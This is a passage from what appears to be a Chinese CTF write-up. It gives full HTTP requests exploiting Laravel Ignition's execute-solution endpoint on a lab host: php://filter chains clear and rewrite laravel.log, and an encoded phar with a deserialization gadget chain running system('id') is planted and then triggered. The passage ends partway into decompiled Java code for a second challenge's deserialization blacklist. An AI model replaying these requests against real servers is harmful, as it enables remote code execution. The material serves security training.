class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">61</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">37</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>A=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span>A=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">65</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">71</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">50</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">5</span>A=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>A=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>得到上面的结果后直接跟着打</p>
<p>清空laravel.log:</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/_ignition/execute-solution HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.20</span></span><br><span class="line"><span class="attr">Cache-Control</span>: <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests</span>: <span class="string">1</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">334</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;</span></span><br><span class="line">    <span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span>:<span class="string">&#123;</span></span><br><span class="line">        <span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;,</span></span><br><span class="line">        <span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
<p>添加前缀：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/_ignition/execute-solution HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.20</span></span><br><span class="line"><span class="attr">Cache-Control</span>: <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests</span>: <span class="string">1</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">169</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;</span></span><br><span class="line">    <span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span>:<span class="string">&#123;</span></span><br><span class="line">        <span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;,</span></span><br><span class="line">        <span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AA&quot;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
<p>写入phar：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/_ignition/execute-solution HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.20</span></span><br><span class="line"><span class="attr">Cache-Control</span>: <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests</span>: <span class="string">1</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">4800</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;</span></span><br><span class="line">    <span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span>:<span class="string">&#123;</span></span><br><span class="line">        <span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;,</span></span><br><span class="line">        <span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=42=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=4C=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=44=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=70=00=5A=00=43=00=63=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4C=00=67=00=61=00=4C=00=32=00=63=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=46=00=6F=00=39=00=53=00=48=00=56=00=36=00=6B=00=4F=00=63=00=69=00=33=00=71=00=33=00=6B=00=31=00=6E=00=72=00=6E=00=5A=00=6C=00=2F=00=44=00=63=00=4F=00=50=00=45=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a&quot;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
<p>注意最后要加一个a</p>
<p>去除脏数据：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/_ignition/execute-solution HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.20</span></span><br><span class="line"><span class="attr">Cache-Control</span>: <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests</span>: <span class="string">1</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">305</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;</span></span><br><span class="line">    <span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span>:<span class="string">&#123;</span></span><br><span class="line">        <span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;,</span></span><br><span class="line">        <span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
<p>触发phar</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/_ignition/execute-solution HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.20</span></span><br><span class="line"><span class="attr">Cache-Control</span>: <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests</span>: <span class="string">1</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">212</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;</span></span><br><span class="line">    <span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span>:<span class="string">&#123;</span></span><br><span class="line">        <span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;,</span></span><br><span class="line">        <span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;phar:///src/storage/logs/laravel.log/test.txt&quot;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"><span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>
<p>注意最后的phar是绝对路径，要自己慢慢试出来的。具体怎么试的我就不把图放上来了。最后读取flag即可：</p>
<img src="/posts/10200/10.png" class title="awa">
<h1><span id="lookup"> LookUP</span></h1>
<p><strong>求一个预期解的wp T_T</strong></p>
<p>题目写了一个自定义的<code>objectInputStream</code>，并且重写了<code>resolveClass</code>添加黑名单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.backdoor.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.backdoor.classes.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/backdoor/util/MyInputstream.class */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInputstream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInputstream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.list.add(TemplatesImpl.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.list.add(hello.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.list.add(HashMap.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.list.add(Hashtable.class.getName());</span><br><span class="line"></span><br><span class="line">        System.out.println(desc.getName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.list.contains(desc.getName())) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line"></span><br><span class="line">    